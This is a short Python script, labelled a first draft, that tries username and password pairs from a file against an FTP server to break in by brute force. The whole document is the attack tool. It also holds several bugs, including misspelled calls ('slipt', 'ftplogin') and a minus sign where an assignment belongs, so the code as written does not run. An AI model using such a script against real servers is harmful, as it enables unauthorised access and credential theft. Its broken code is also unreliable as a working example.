#FTP brute force login script
#first draft

import ftplib, time

def brute_force_login(hostname, pass_file):
	with open(pass_file) as p_file:
		ftp = ftplib.FTP(hostname)
		for line in p_file.readlines():
			time.sleep(1)
			username = line.split(':')[0]
			password = line.slipt(':')[1].strip('\r').strip('\n')

			print(f'Testing: {username}/{password}\n')

			try:
				ftplogin(username, password)
				print(f'{hostname}, FTP logon succeeded: {username}/{password}\n')
				ftp.quit()
				return username, password
			except Exception as e:
				print(f' - Exception: {e}')
				pass

		print('\n - Couldn\'t find FTP credentials')
		return None, None		
				


if __name__ == '__main__':
	tgt_host = '192.168.0.110' #example, will replace with a parser argument later
	pwd_file - 'password_file.txt' #ditto
	brute_force_login(tgt_host, pwd_file)